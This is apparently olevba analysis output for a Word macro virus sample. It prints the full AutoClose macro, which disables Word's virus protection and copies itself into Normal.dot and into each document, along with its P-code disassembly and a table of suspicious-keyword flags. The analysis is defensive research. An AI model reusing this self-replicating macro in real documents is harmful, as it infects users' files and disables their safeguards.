olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Example.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Example.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cali.bas 
in file: Virus.MSWord.Example.d - OLE stream: 'Macros/VBA/Cali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

Application.EnableCancelKey = False
Options.VirusProtection = False
'Application.CommandBars("Tools").Controls(13).Enabled = False
cadd1 = "California"
cadd2 = "Calidad"
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = Left(cadd1, 4) Then GoTo EndOfVirus
    Next i
    VSource = NormalTemplate.FullName
    VDestiny = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
     If NormalTemplate.VBProject.VBComponents(i).Name = Left(cadd2, 4) Then GoTo EndOfVirus
  Next i
  VSource = ActiveDocument.FullName
  VDestiny = NormalTemplate.FullName
End If

Application.OrganizerCopy VSource, VDestiny, Left(cadd2, 4), wdOrganizerObjectProjectItems
EndOfVirus:
MsgBox "Hola"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Example.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Cali - 2052 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	QuoteRem 0x0000 0x003D "Application.CommandBars("Tools").Controls(13).Enabled = False"
' Line #5:
' 	LitStr 0x000A "California"
' 	St cadd1 
' Line #6:
' 	LitStr 0x0007 "Calidad"
' 	St cadd2 
' Line #7:
' 	Ld ThisDocument 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld cadd1 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndOfVirus 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VSource 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VDestiny 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld cadd2 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndOfVirus 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VSource 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VDestiny 
' Line #19:
' 	EndIfBlock 
' Line #20:
' Line #21:
' 	Ld VSource 
' 	Ld VDestiny 
' 	Ld cadd2 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	Label EndOfVirus 
' Line #23:
' 	LitStr 0x0004 "Hola"
' 	ArgsCall MsgBox 0x0001 
' Line #24:
' 	EndSub 
' Line #25:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

